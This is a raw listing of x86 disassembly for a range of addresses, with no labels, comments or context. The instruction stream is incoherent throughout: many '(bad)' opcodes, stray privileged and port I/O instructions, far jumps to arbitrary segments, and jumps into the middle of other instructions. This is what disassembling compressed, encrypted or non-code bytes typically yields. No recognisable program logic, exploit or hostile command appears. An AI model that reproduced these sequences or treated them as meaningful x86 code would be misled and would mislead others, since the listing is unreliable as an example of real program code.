  40ba1d:	aam    0xba
  40ba1f:	add    cl,bh
  40ba21:	shl    ch,1
  40ba23:	sbb    al,0xeb
  40ba25:	push   edi
  40ba26:	les    esp,FWORD PTR [edx+edi*2-0x730043ab]
  40ba2d:	pop    eax
  40ba2e:	adc    bh,BYTE PTR [ebx-0x26]
  40ba31:	mov    al,0xad
  40ba33:	inc    eax
  40ba34:	(bad)  
  40ba35:	xchg   esi,eax
  40ba36:	mov    ch,BYTE PTR [edx]
  40ba38:	pop    ebp
  40ba39:	or     BYTE PTR [edx],dh
  40ba3b:	jo     0x40b9cf
  40ba3d:	adc    ecx,DWORD PTR [esi]
  40ba3f:	sub    ch,dh
  40ba41:	adc    al,0x30
  40ba43:	mov    esi,0xf5c6437e
  40ba48:	shl    BYTE PTR ds:0xbaeb4f2d,1
  40ba4e:	sbb    al,BYTE PTR [ecx+0xf]
  40ba51:	(bad)  
  40ba52:	(bad)  
  40ba53:	fimul  DWORD PTR [ebx]
  40ba55:	retf   
  40ba56:	imul   ebp,DWORD PTR [edi-0x68],0xffffffb8
  40ba5a:	imul   esi,eax,0x7f
  40ba5d:	or     ch,BYTE PTR [edx+ebx*8+0x7be99be]
  40ba64:	leave  
  40ba65:	mov    ah,0x8f
  40ba67:	inc    esp
  40ba68:	das    
  40ba69:	push   ebp
  40ba6a:	ret    0xfd67
  40ba6d:	inc    eax
  40ba6e:	xchg   ebp,eax
  40ba6f:	das    
  40ba70:	aam    0x69
  40ba72:	test   eax,0xfbd78379
  40ba77:	rcl    BYTE PTR [eax],cl
  40ba79:	rol    BYTE PTR [esi+0x56d5e7d],1
  40ba7f:	mov    edx,0xdb1eb73d
  40ba84:	add    bh,BYTE PTR [ebx+esi*4+0x3b]
  40ba88:	clc    
  40ba89:	or     ecx,edx
  40ba8b:	shl    BYTE PTR [ebx+0x27],0x36
  40ba8f:	xor    DWORD PTR [ecx+0x3c1fe94c],ebx
  40ba95:	shr    DWORD PTR [edx+esi*4],1
  40ba98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba99:	into   
  40ba9a:	or     DWORD PTR [edx+0x454ed41d],edx
  40baa0:	stos   BYTE PTR es:[edi],al
  40baa1:	test   BYTE PTR [bx+si-0x192d],bh
  40baa6:	dec    ebp
  40baa7:	cmp    BYTE PTR [esi-0x3b5e942f],0x10
  40baae:	rcr    edi,cl
  40bab0:	mov    ebp,0x3236ac0c
  40bab5:	fwait
  40bab6:	adc    esi,esi
  40bab8:	jno    0x40bac4
  40baba:	inc    ecx
  40babb:	js     0x40bade
  40babd:	lock (bad) 
  40babf:	fisttp WORD PTR [esi]
  40bac1:	(bad)  
  40bac2:	test   dl,0xbc
  40bac5:	lea    edi,[esi-0x5fc34d19]
  40bacb:	push   ebx
  40bacc:	dec    eax
  40bacd:	sbb    BYTE PTR [eax-0x5f3df64f],dl
  40bad3:	push   esp
  40bad4:	pop    edi
  40bad5:	fsubp  st(5),st
  40bad7:	lea    edi,[edi]
  40bad9:	or     eax,0x506fef98
  40bade:	mov    bh,0xcd
  40bae0:	daa    
  40bae1:	inc    ebx
  40bae2:	ins    BYTE PTR es:[edi],dx
  40bae3:	xor    al,BYTE PTR [ebx-0x5ab6f6b7]
  40bae9:	or     ebp,esp
  40baeb:	in     al,0xe5
  40baed:	mov    bh,0xa2
  40baef:	cld    
  40baf0:	int3   
  40baf1:	or     BYTE PTR [eax+0x13f7ce08],0x33
  40baf8:	jb     0x40bb11
  40bafa:	jp     0x40ba90
  40bafc:	rcr    eax,0xdb
  40baff:	stos   BYTE PTR es:[edi],al
  40bb00:	(bad)
  40bb03:	push   eax
  40bb04:	xor    eax,0x3b7c4361
  40bb09:	test   eax,0xe82a56fd
  40bb0e:	(bad)  
  40bb10:	imul   esp,DWORD PTR [edx+0x79],0x817f53bf
  40bb17:	ins    BYTE PTR es:[edi],dx
  40bb18:	loope  0x40bb7c
  40bb1a:	mov    edx,0x1bfa9767
  40bb1f:	stos   BYTE PTR es:[edi],al
  40bb20:	xor    bh,dh
  40bb22:	scas   eax,DWORD PTR es:[edi]
  40bb23:	xchg   esi,eax
  40bb24:	iret   
  40bb25:	dec    ecx
  40bb26:	jo     0x40bac4
  40bb28:	(bad)  
  40bb2a:	pop    esp
  40bb2b:	inc    esp
  40bb2c:	adc    DWORD PTR [esi-0x2af04720],ebp
  40bb32:	in     al,dx
  40bb33:	leave  
  40bb34:	aaa    
  40bb35:	pop    ebx
  40bb36:	cmp    al,0x9d
  40bb38:	or     eax,0x14a544de
  40bb3d:	test   DWORD PTR ds:0x782fa041,esi
  40bb43:	or     al,ah
  40bb45:	rol    BYTE PTR [edx+0x22],cl
  40bb48:	neg    DWORD PTR [ecx+ecx*1]
  40bb4b:	lds    esi,FWORD PTR [esp+ebp*2]
  40bb4e:	data16 (bad) 
  40bb50:	popf   
  40bb51:	add    eax,0x879e894f
  40bb56:	and    DWORD PTR [ecx],esp
  40bb58:	bts    DWORD PTR [edx],edi
  40bb5b:	and    ebx,ebx
  40bb5d:	stos   DWORD PTR es:[edi],eax
  40bb5e:	pusha  
  40bb5f:	lds    ebp,FWORD PTR [ebx]
  40bb61:	(bad)  
  40bb62:	(bad)  
  40bb63:	mov    cl,0xba
  40bb65:	ins    BYTE PTR es:[edi],dx
  40bb66:	int    0x58
  40bb68:	and    ah,BYTE PTR [ecx+0x4a]
  40bb6b:	loope  0x40bb47
  40bb6d:	sbb    cl,dh
  40bb6f:	jle    0x40bb37
  40bb71:	out    0x2c,eax
  40bb73:	sar    BYTE PTR gs:[ebp+0x3d140d81],0xab
  40bb7b:	xor    eax,0x8ddb81ba
  40bb80:	dec    esi
  40bb81:	inc    esp
  40bb82:	mov    edx,0x4a096a89
  40bb87:	lahf   
  40bb88:	arpl   di,ax
  40bb8a:	adc    DWORD PTR ds:0x360cee48,ebp
  40bb90:	mov    WORD PTR [edx],gs
  40bb92:	(bad)  
  40bb93:	sahf   
  40bb94:	les    edi,FWORD PTR [ebp-0x331658fa]
  40bb9a:	push   cs
  40bb9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb9c:	dec    ebx
  40bb9d:	loop   0x40bb5c
  40bb9f:	cwde   
  40bba0:	push   edi
  40bba1:	retf   
  40bba2:	jae    0x40bc11
  40bba4:	inc    ecx
  40bba5:	imul   edx,DWORD PTR [ecx+eax*1+0x40],0xffffffab
  40bbaa:	iret   
  40bbab:	inc    ebp
  40bbad:	adc    eax,0xe76c5919
  40bbb2:	outs   dx,DWORD PTR ds:[esi]
  40bbb3:	stos   DWORD PTR es:[edi],eax
  40bbb4:	pop    ss
  40bbb5:	ds ins DWORD PTR es:[edi],dx
  40bbb7:	(bad)  
  40bbb8:	jo     0x40bc0b
  40bbba:	cmc    
  40bbbb:	stc    
  40bbbc:	xchg   edx,eax
  40bbbd:	clc    
  40bbbe:	rol    bl,0x22
  40bbc1:	ja     0x40bbed
  40bbc3:	add    BYTE PTR [ebp+esi*8-0xd],ah
  40bbc7:	adc    al,0x44
  40bbc9:	jmp    FWORD PTR [edx]
  40bbcb:	and    dh,BYTE PTR [ebx]
  40bbcd:	fbstp  TBYTE PTR [eax-0x33]
  40bbd0:	retf   
  40bbd1:	nop
  40bbd2:	mov    ebx,0x944bd307
  40bbd7:	add    eax,0x1603cf16
  40bbdc:	mov    bh,0x5
  40bbde:	aam    0xda
  40bbe0:	sbb    dh,0x92
  40bbe3:	pop    ds
  40bbe4:	aaa    
  40bbe5:	mov    esi,0xb0fe6746
  40bbea:	hlt    
  40bbeb:	sbb    BYTE PTR ds:0xa261a24,0xd3
  40bbf2:	fs mov ah,0x35
  40bbf5:	mov    edi,0x615898a9
  40bbfa:	aaa    
  40bbfb:	imul   esi
  40bbfd:	int    0xb3
  40bbff:	mov    dh,0xf0
  40bc01:	push   esi
  40bc02:	jo     0x40bbeb
  40bc04:	mov    ebp,0x5c380e00
  40bc09:	mov    al,0xc0
  40bc0b:	daa    
  40bc0c:	jg     0x40bc87
  40bc0e:	into   
  40bc0f:	imul   esi,DWORD PTR [ebx+0x76e67d1d],0x16
  40bc16:	lea    ebx,[eax]
  40bc18:	mov    bl,0x34
  40bc1a:	mov    esi,0x747a586
  40bc1f:	sahf   
  40bc20:	add    eax,0x5554486b
  40bc25:	jne    0x40bc1d
  40bc27:	sbb    ch,bh
  40bc29:	jno    0x40bc3d
  40bc2b:	ja     0x40bbc6
  40bc2d:	addr16 pusha 
  40bc2f:	jp     0x40bc48
  40bc31:	lea    eax,[eax+eax*4]
  40bc34:	or     edx,DWORD PTR [ebx+0x7d]
  40bc37:	mov    dh,0x92
  40bc39:	sbb    eax,0x4f85acf5
  40bc3e:	push   ebp
  40bc3f:	mov    ecx,0xaf8010a5
  40bc44:	sbb    ah,BYTE PTR [edx]
  40bc46:	adc    bh,BYTE PTR ds:0x2d3562b3
  40bc4c:	sub    eax,0x4ddce683
  40bc51:	adc    al,BYTE PTR [eax-0x71af8a41]
  40bc57:	jae    0x40bbfb
  40bc59:	mov    edi,DWORD PTR [eax+0x41]
  40bc5c:	leave  
  40bc5d:	fdiv   DWORD PTR [ecx+0x52b7e520]
  40bc63:	push   0x38b11163
  40bc68:	mov    eax,ds:0x52802363
  40bc6d:	int3   
  40bc6e:	stos   DWORD PTR es:[edi],eax
  40bc6f:	jle    0x40bc15
  40bc71:	and    eax,0x3c45569a
  40bc76:	gs dec esi
  40bc78:	xchg   ebp,eax
  40bc79:	push   eax
  40bc7a:	cwde   
  40bc7b:	mov    esp,0x8bef75d9
  40bc80:	sbb    ch,BYTE PTR [esi-0xccd61ea]
  40bc86:	mov    eax,0x7f231b2e
  40bc8b:	fld    DWORD PTR [esi+0x5562a7f9]
  40bc91:	cld    
  40bc92:	or     dh,al
  40bc94:	cmp    eax,0x3d96790b
  40bc99:	cs (bad) 
  40bc9b:	xchg   edx,eax
  40bc9c:	js     0x40bd11
  40bc9e:	add    dl,bh
  40bca0:	fldcw  WORD PTR [eax+0x6ccc5520]
  40bca6:	jecxz  0x40bc54
  40bca8:	push   edi
  40bca9:	xchg   esp,eax
  40bcaa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bcab:	jmp    0xb551:0xe06a44f0
  40bcb2:	jae    0x40bc5a
  40bcb4:	dec    ebp
  40bcb5:	pop    es
  40bcb6:	idiv   cl
  40bcb8:	aaa    
  40bcb9:	sbb    eax,0xf571bf21
  40bcbe:	mov    dl,0xba
  40bcc0:	pop    edx
  40bcc1:	and    eax,0xb3f8c620
  40bcc6:	je     0x40bc56
  40bcc8:	jl     0x40bd14
  40bcca:	add    ebp,ecx
  40bccc:	repz repnz and bl,BYTE PTR [eax+eiz*8+0x37]
  40bcd2:	pop    edx
  40bcd3:	inc    eax
  40bcd4:	jmp    0x40bd10
  40bcd6:	xlat   BYTE PTR ds:[ebx]
  40bcd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bcd8:	das    
  40bcd9:	inc    eax
  40bcda:	mov    edi,0x474c22bf
  40bcdf:	in     eax,0xbc
  40bce1:	dec    esp
  40bce2:	xchg   esp,eax
  40bce3:	aam    0x83
  40bce5:	fwait
  40bce6:	in     eax,0x42
  40bce8:	cld    
  40bce9:	in     al,0xb4
  40bceb:	dec    ebx
  40bcec:	repnz xor DWORD PTR [eax+0x49],0x35
  40bcf1:	shl    dl,cl
  40bcf3:	in     al,0x58
  40bcf5:	stos   BYTE PTR es:[edi],al
  40bcf6:	fs pop eax
  40bcf8:	outs   dx,BYTE PTR ds:[esi]
  40bcf9:	je     0x40bd3d
  40bcfb:	ret    0x4d7
  40bcfe:	mov    esp,0x256c329c
  40bd03:	test   BYTE PTR [ebp+eax*8+0x68],cl
  40bd07:	(bad)  
  40bd08:	push   ebx
  40bd09:	std    
  40bd0a:	and    ebx,DWORD PTR [ebx]
  40bd0c:	fdiv   st(6),st
  40bd0e:	mov    edi,0xc0bc82e2
  40bd13:	retf   
  40bd14:	fwait
  40bd15:	mov    WORD PTR ds:0x877a6993,?
  40bd1b:	fstp   DWORD PTR [ebp-0x34]
  40bd1e:	add    eax,0xb337cef2
  40bd23:	popa   
  40bd24:	in     al,0x2c
  40bd26:	push   es
  40bd27:	imul   edi,DWORD PTR [ebp+0x286d7a83],0x255e2b2e
  40bd31:	push   ecx
  40bd32:	inc    edx
  40bd33:	stc    
  40bd34:	mov    ah,0x77
  40bd36:	mov    ss,WORD PTR [ebp+ebx*4-0x1c]
  40bd3a:	sbb    eax,0x827e785a
  40bd3f:	mov    ebx,fs
  40bd41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd42:	icebp  
  40bd43:	shr    DWORD PTR [esi],cl
  40bd45:	pop    edx
  40bd46:	jg     0x40bd94
  40bd48:	adc    al,0x17
  40bd4a:	pop    ds
  40bd4b:	dec    ecx
  40bd4c:	cmp    al,0x66
  40bd4e:	cmove  ebp,DWORD PTR [ebx-0x32]
  40bd52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd53:	loope  0x40bd61
  40bd55:	and    DWORD PTR [edi+ebx*8+0x5d],esi
  40bd59:	jmp    0xd668:0xce83e1
  40bd60:	data16 int3 
  40bd62:	aam    0xab
  40bd64:	push   eax
  40bd65:	rcl    DWORD PTR [ecx],1
  40bd67:	inc    esp
  40bd68:	shl    DWORD PTR [edi+0x48],cl
  40bd6b:	pop    esp
  40bd6c:	or     ah,BYTE PTR [esi-0x5b]
  40bd6f:	jmp    0x40bddf
  40bd71:	call   0xf38187a4
  40bd76:	xlat   BYTE PTR ds:[bx]
  40bd78:	jmp    0x40bda0
  40bd7a:	adc    eax,0xcdef36fc
  40bd7f:	jb     0x40bd14
  40bd81:	jecxz  0x40bd1c
  40bd83:	xchg   esp,eax
  40bd84:	sub    edx,edi
  40bd86:	or     BYTE PTR [eax-0x5f],0x3a
  40bd8a:	jmp    0x839d165c
  40bd8f:	pusha  
  40bd90:	cli    
  40bd91:	xchg   ecx,eax
  40bd92:	ficom  DWORD PTR [ebx]
  40bd94:	dec    edi
  40bd95:	mov    ebx,0x72754e6f
  40bd9a:	push   eax
  40bd9b:	or     BYTE PTR [edx-0x2],0x4
  40bd9f:	pushf  
  40bda0:	push   edx
  40bda1:	aam    0x16
  40bda3:	sti    
  40bda4:	inc    edi
  40bda5:	shl    DWORD PTR [esi-0x60],1
  40bda8:	pop    ecx
  40bdaa:	out    0x1f,al
  40bdac:	xor    ecx,DWORD PTR ds:0xec950f70
  40bdb2:	retf   
  40bdb3:	sbb    dl,BYTE PTR [ecx-0x4c1e8745]
  40bdb9:	cmp    edx,edi
  40bdbb:	adc    eax,0x46508818
  40bdc0:	jmp    0x40bd72
  40bdc2:	imul   ebx,DWORD PTR ds:0x754cdbee,0xf7006b8a
  40bdcc:	push   cs
  40bdcd:	mul    DWORD PTR [eax]
  40bdcf:	std    
  40bdd0:	sub    ecx,DWORD PTR ds:0x51ce49c9
  40bdd6:	rcl    BYTE PTR [esi+0x32],0x2f
  40bdda:	lds    edx,FWORD PTR [ecx]
  40bddc:	icebp  
  40bddd:	or     al,0x7c
  40bddf:	ins    DWORD PTR es:[edi],dx
  40bde0:	pop    ecx
  40bde1:	fisub  WORD PTR [ebx]
  40bde3:	cmp    ch,BYTE PTR ds:0xbbaf450f
  40bde9:	mov    edx,0xb0cd4b69
  40bdee:	into   
  40bdef:	inc    esi
  40bdf0:	arpl   WORD PTR [ebx],ax
  40bdf2:	mul    edi
  40bdf4:	jl     0x40be75
  40bdf6:	cmp    DWORD PTR [edx-0xd],edi
  40bdf9:	pop    esi
  40bdfa:	jne    0x40bdd5
  40bdfc:	outs   dx,DWORD PTR ds:[esi]
  40bdfd:	(bad)  [ebx+0x52f2faf]
  40be03:	adc    eax,0x95d1e47a
  40be08:	pop    ds
  40be09:	mov    cl,0x53
  40be0b:	mov    cs,edx
  40be0d:	and    dl,BYTE PTR [eax]
  40be0f:	or     BYTE PTR [ebp+0x7a],dl
  40be12:	test   BYTE PTR [ebp+0x6b7db604],al
  40be18:	add    al,0x84
  40be1a:	mov    bl,0x62
  40be1c:	je     0x40be0f
  40be1e:	sar    BYTE PTR [edi+0x3f],0x24
  40be22:	cli    
  40be23:	icebp  
  40be24:	and    BYTE PTR [esi-0x77],dh
  40be27:	ficom  DWORD PTR [ecx-0x65]
  40be2a:	retf   0x66f3
  40be2d:	mov    ds:0x15b3d8ef,al
  40be32:	mul    DWORD PTR [eax+0x3c]
  40be35:	test   BYTE PTR [ebx+0x619a3f80],cl
  40be3b:	pop    edx
  40be3c:	mov    ds:0xbdcdc367,eax
  40be41:	dec    ebp
  40be42:	xchg   DWORD PTR [ecx-0x4e],esp
  40be45:	cmovne esp,DWORD PTR [eax]
  40be48:	(bad)  
  40be49:	fsubr  st,st(2)
  40be4b:	enter  0xeae0,0xe5
  40be4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be50:	mov    ds:0x2cf147b9,al
  40be55:	jge    0x40be30
  40be57:	int    0x3e
  40be59:	jmp    0xfb88d7fb
  40be5e:	rcl    eax,cl
  40be60:	adc    eax,0x99d7f1db
  40be65:	aam    0x3b
  40be67:	bound  ebx,QWORD PTR [edx]
  40be69:	mov    al,al
  40be6b:	retf   
  40be6c:	pop    ecx
  40be6d:	jle    0x40be8e
  40be6f:	mov    BYTE PTR [ecx],al
  40be71:	repz xor DWORD PTR [edx],esi
  40be74:	cs push edx
  40be76:	or     BYTE PTR [edi],ch
  40be78:	mov    eax,eax
  40be7a:	popa   
  40be7b:	shl    dl,1
  40be7d:	scas   al,BYTE PTR es:[edi]
  40be7e:	xchg   DWORD PTR [edx+0x7f0903cc],ecx
  40be84:	mov    al,0x22
  40be86:	cld    
  40be87:	cmp    ch,al
  40be89:	cmc    
  40be8a:	and    DWORD PTR [edx],esi
  40be8c:	jae    0x40be95
  40be8e:	xor    ch,BYTE PTR [ebx-0x3c]
  40be91:	or     edx,DWORD PTR [edx+0x21]
  40be94:	ror    DWORD PTR [edx-0x194a3ad2],1
  40be9a:	jecxz  0x40be66
  40be9c:	cmp    cl,BYTE PTR [esi+0x45]
  40be9f:	add    edi,0xffffffe7
  40bea2:	fisub  DWORD PTR [ebx*1-0x5d08d48f]
  40bea9:	jl     0x40be75
  40beab:	imul   esp,esp,0x370878d8
  40beb1:	stc    
  40beb2:	push   ss
  40beb3:	mov    ds:0x43cd3d28,eax
  40beb8:	(bad)  
  40beb9:	retf   
  40beba:	xor    dl,dh
  40bebc:	int    0x7a
  40bebe:	jne    0x40beb1
  40bec0:	fdivr  QWORD PTR [esp+ebx*2+0x31564fcc]
  40bec7:	mov    al,ds:0x58608674
  40becc:	sbb    eax,0xd9f2b6e7
  40bed1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bed2:	inc    esi
  40bed3:	outs   dx,DWORD PTR ds:[esi]
  40bed4:	cmc    
  40bed5:	ret    0xe7fe
  40bed8:	and    al,0x98
  40beda:	les    eax,FWORD PTR [esi+ecx*1+0x1be3429c]
  40bee1:	clc    
  40bee2:	mov    dl,0x15
  40bee4:	jb     0x40bf5b
  40bee6:	jle    0x40be91
  40bee8:	loopne 0x40befb
  40beea:	mov    ds:0x6ebfbb7c,eax
  40beef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bef0:	push   eax
  40bef1:	loope  0x40be7b
  40bef3:	sbb    BYTE PTR [ecx],cl
  40bef5:	nop
  40bef6:	pop    eax
  40bef7:	adc    DWORD PTR [ebx+0x48c6937],edi
  40befd:	lea    ebp,[ecx]
  40beff:	sub    edi,0xffffffb8
  40bf02:	in     al,dx
  40bf03:	out    0xce,al
  40bf05:	xor    eax,0xe1eddbdd
  40bf0a:	test   BYTE PTR [ebp+0x795e640d],dl
  40bf10:	out    dx,al
  40bf11:	push   es
  40bf12:	rcl    BYTE PTR [esi],1
  40bf14:	fisttp WORD PTR [edi+0x7b4a669a]
  40bf1a:	pop    edi
  40bf1b:	ss jmp 0x40bf18
  40bf1e:	leave  
  40bf1f:	push   0x481102da
  40bf24:	pop    edx
  40bf25:	inc    edi
  40bf26:	and    al,0xd4
  40bf28:	inc    ebx
  40bf29:	cmp    dh,BYTE PTR [eax+ecx*8-0x4721f241]
  40bf30:	pop    esi
  40bf31:	xlat   BYTE PTR ds:[ebx]
  40bf32:	mov    bh,0x53
  40bf34:	or     al,0x37
  40bf36:	ret    
  40bf37:	cli    
  40bf38:	inc    esi
  40bf39:	ret    0x7c9f
  40bf3c:	and    eax,0x95ed0b79
  40bf41:	fldenv [edi+0x40c3fe63]
  40bf47:	xlat   BYTE PTR ds:[ebx]
  40bf48:	add    ah,ch
  40bf4a:	inc    esi
  40bf4b:	jmp    0x9a92e3cc
  40bf50:	dec    esi
  40bf51:	adc    DWORD PTR [ebp+0x2b],esi
  40bf54:	mov    ebp,0x4225febf
  40bf59:	jmp    0xe46fcb20
  40bf5e:	leave  
  40bf5f:	ficom  WORD PTR [eax]
  40bf61:	pop    es
  40bf62:	sub    al,0x58
  40bf64:	add    BYTE PTR ds:0xe6bd082e,bh
  40bf6a:	jle    0x40bf03
  40bf6c:	fbstp  TBYTE PTR [esi]
  40bf6e:	xor    esi,DWORD PTR [ebx]
  40bf70:	leave  
  40bf71:	(bad)  
  40bf72:	push   ebp
  40bf73:	scas   eax,DWORD PTR es:[edi]
  40bf74:	push   edx
  40bf75:	sub    BYTE PTR [ecx+0x2e],0xc8
  40bf79:	lea    ecx,[eax-0x6c]
  40bf7c:	les    esi,FWORD PTR [eax+0x2a]
  40bf7f:	inc    ecx
  40bf80:	int    0xbb
  40bf82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf83:	xor    al,0x24
  40bf85:	and    DWORD PTR [edi-0x1c5c7d],ebp
  40bf8b:	fs not edx
  40bf8e:	rcr    BYTE PTR [ecx+eax*1-0x332b23fd],cl
  40bf95:	jns    0x40bf3a
  40bf97:	mov    ah,bh
  40bf99:	xchg   esi,eax
  40bf9a:	mov    edi,0x9212a0ca
  40bf9f:	repz sbb al,0x8
  40bfa2:	cmp    eax,0xed4d07f1
  40bfa7:	hlt    
  40bfa8:	push   esi
  40bfa9:	inc    edi
  40bfaa:	jb     0x40bf95
  40bfac:	(bad)
  40bfaf:	cmp    BYTE PTR [edx],bh
  40bfb1:	mov    eax,es:0xd616e0e0
  40bfb7:	pop    esi
  40bfb8:	outs   dx,DWORD PTR ds:[esi]
  40bfb9:	ss dec esp
  40bfbb:	adc    eax,0xe67e50c5
  40bfc0:	loope  0x40bf8d
  40bfc2:	in     al,0x24
  40bfc4:	dec    edx
  40bfc5:	pop    esp
  40bfc6:	stc    
  40bfc7:	fwait
  40bfc8:	aaa    
  40bfc9:	lods   al,BYTE PTR ds:[esi]
  40bfca:	dec    esi
  40bfcb:	add    BYTE PTR ds:0xe5a5590c,bh
  40bfd1:	mov    ss,WORD PTR [esi]
  40bfd3:	xor    al,0x83
  40bfd5:	push   esp
  40bfd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bfd7:	sahf   
  40bfd8:	popf   
  40bfd9:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  40bfdb:	jns    0x40bfb4
  40bfdd:	into   
  40bfde:	into   
  40bfdf:	mov    ecx,0xa06fc2de
  40bfe4:	jno    0x40bf7a
  40bfe6:	dec    edi
  40bfe7:	and    eax,0x50e71c17
  40bfec:	pop    esp
  40bfed:	in     al,dx
  40bfee:	sbb    BYTE PTR [ebx+0x16],0x90
  40bff2:	out    dx,eax
  40bff3:	out    0x64,eax
  40bff5:	sbb    BYTE PTR [ecx-0x5e2acfe8],0x8c
  40bffc:	pop    ss
  40bffd:	(bad)  
  40bffe:	jl     0x40c075
  40c000:	jae    0x40c00d
  40c002:	sub    al,0x4a
  40c004:	mov    ds:0x6c55e21d,eax
  40c009:	je     0x40c06a
  40c00b:	cmp    ah,BYTE PTR cs:[ebx-0x7]
  40c00f:	mov    eax,0xf2005f58
  40c014:	mov    ss,WORD PTR [ebx-0x789f0cbb]
  40c01a:	or     eax,DWORD PTR [esi-0x5b]
  40c01d:	in     al,0x1d
  40c01f:	call   0x3aec283e
  40c024:	call   0xd19c089f
  40c029:	pop    edi
  40c02a:	cmp    al,0x28
  40c02c:	mov    ds:0xaf800cb7,al
  40c031:	xlat   BYTE PTR ds:[ebx]
  40c032:	ret    
  40c033:	sub    BYTE PTR [eax+0xc],cl
  40c036:	mov    bl,0xa7
  40c038:	pop    es
  40c039:	add    BYTE PTR [eax-0x55184a01],0x6e
  40c040:	loopne 0x40c07d
  40c042:	add    eax,0xe52e2896
  40c047:	jge    0x40c05b
  40c049:	xchg   ebx,eax
  40c04a:	fidiv  WORD PTR [ebp+edi*2-0x17]
  40c04e:	push   ecx
  40c04f:	mov    ecx,0xe66a07a0
  40c054:	add    BYTE PTR [ebp+ebx*4+0x1a39cc0b],0x5
  40c05c:	jecxz  0x40c0c2
  40c05e:	mov    WORD PTR [ebp-0x1f],?
  40c061:	into   
  40c062:	loope  0x40bfea
  40c064:	sti    
  40c065:	xchg   edi,eax
  40c066:	push   ds
  40c067:	inc    edx
  40c068:	(bad)  
  40c069:	stc    
  40c06a:	push   ebp
  40c06b:	gs mov esi,0x813283e3
  40c071:	mov    esi,0x31dbd5d5
  40c076:	cmp    esi,DWORD PTR [ebx+0x1623ef3c]
  40c07c:	in     eax,dx
  40c07d:	sbb    ebp,DWORD PTR [edx]
  40c07f:	pop    ds
  40c080:	xchg   DWORD PTR [ebp-0x6500c19f],esi
  40c086:	xchg   ebx,eax
  40c087:	dec    esp
  40c088:	aad    0x9e
  40c08a:	mov    al,0x2c
  40c08c:	xor    BYTE PTR [eax-0x392171a2],0x98
  40c093:	pop    edi
  40c094:	mov    ebp,0xdb2e2f6c
  40c099:	and    DWORD PTR [edx-0x5b],ebp
  40c09c:	inc    ebx
  40c09d:	cmc    
  40c09e:	mov    al,0x4f
  40c0a0:	mov    edx,DWORD PTR [ecx]
  40c0a2:	stos   BYTE PTR es:[edi],al
  40c0a3:	inc    ebp
  40c0a4:	inc    edx
  40c0a5:	xor    ebp,DWORD PTR [ecx-0x7b7736dc]
  40c0ab:	in     eax,dx
  40c0ac:	ret    
  40c0ad:	mov    bh,0x86
  40c0af:	enter  0x5815,0x2c
  40c0b3:	inc    edx
  40c0b4:	dec    esp
  40c0b5:	aaa    
  40c0b6:	jne    0x40c0d7
  40c0b8:	push   0x38
  40c0ba:	xor    edx,ecx
  40c0bc:	test   BYTE PTR [ebx-0xc],dh
  40c0bf:	or     BYTE PTR [eax],bh
  40c0c1:	loopne 0x40c09b
  40c0c3:	mov    bh,0xbb
  40c0c5:	mov    edx,DWORD PTR [eax]
  40c0c7:	pop    esi
  40c0c8:	scas   eax,DWORD PTR es:[edi]
  40c0c9:	jp     0x40c12e
  40c0cb:	cli    
  40c0cc:	mov    esi,0xb57c4056
  40c0d1:	pop    esp
  40c0d2:	stos   DWORD PTR es:[edi],eax
  40c0d3:	popa   
  40c0d4:	and    ecx,DWORD PTR ds:0xfde60454
  40c0da:	cmp    ch,BYTE PTR [esi]
  40c0dc:	xchg   ecx,eax
  40c0dd:	xlat   BYTE PTR ds:[ebx]
  40c0de:	adc    al,0xc2
  40c0e0:	ret    
  40c0e1:	clc    
  40c0e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c0e3:	bound  edx,QWORD PTR [ecx]
  40c0e5:	mov    bh,0xde
  40c0e7:	cmp    edx,ecx
  40c0e9:	xor    WORD PTR [ebp+0x56b7fc7b],0xa587
  40c0f2:	pop    ebp
  40c0f3:	sub    BYTE PTR [ebp-0x61d63dc8],0x3e
  40c0fa:	inc    ebp
  40c0fb:	into   
  40c0fc:	addr16 inc ebx
  40c0fe:	mov    ds:0xa159bd5a,eax
  40c103:	fwait
  40c104:	push   ebp
  40c105:	nop
  40c106:	pop    edi
  40c107:	push   ebp
  40c108:	bound  edi,QWORD PTR [edi]
  40c10a:	dec    ebp
  40c10b:	inc    edi
  40c10c:	or     bl,BYTE PTR [ecx-0x76459fab]
  40c112:	mov    ebx,DWORD PTR [ecx-0xf40d1c4]
  40c118:	push   esp
  40c119:	popa   
  40c11a:	lods   al,BYTE PTR ds:[esi]
  40c11b:	sar    ebp,1
  40c11d:	retf   0x7e27
  40c120:	test   al,0x15
  40c122:	inc    edi
  40c123:	or     DWORD PTR [eax+0x7c],0xffffffe0
  40c127:	sub    eax,0xd40dd791
  40c12c:	lds    edi,FWORD PTR [eax]
  40c12e:	(bad)  
  40c12f:	push   edi
  40c130:	adc    DWORD PTR [ebx],ebp
  40c132:	jl     0x40c122
  40c134:	mov    dh,0xc5
  40c136:	into   
  40c137:	xchg   ebx,eax
  40c138:	bound  ebp,QWORD PTR [edx+ebp*8+0x55d7e6e2]
  40c13f:	rcr    BYTE PTR [edx+0x62],cl
  40c142:	or     ah,cl
  40c144:	adc    eax,eax
  40c146:	pop    ebx
  40c147:	and    al,0xf4
  40c149:	fcomp  DWORD PTR [esi+0x3efa41b3]
  40c14f:	shl    cl,0x98
  40c152:	push   esp
  40c153:	add    al,0x25
  40c155:	mov    ds:0x552e3063,al
  40c15a:	jae    0x40c1cb
  40c15c:	loope  0x40c0f7
  40c15e:	dec    ecx
  40c15f:	shl    DWORD PTR [edi+0x1a240adb],0x9
  40c166:	mov    edi,0x89913016
  40c16b:	mov    esp,DWORD PTR [ebx+0x607c4b20]
  40c171:	add    al,0xde
  40c173:	pop    ebx
  40c174:	push   edx
  40c175:	inc    eax
  40c176:	and    ecx,DWORD PTR [esi+ecx*1-0x2578059d]
  40c17d:	test   al,0x6f
  40c17f:	xor    DWORD PTR [edi],0xffffff8f
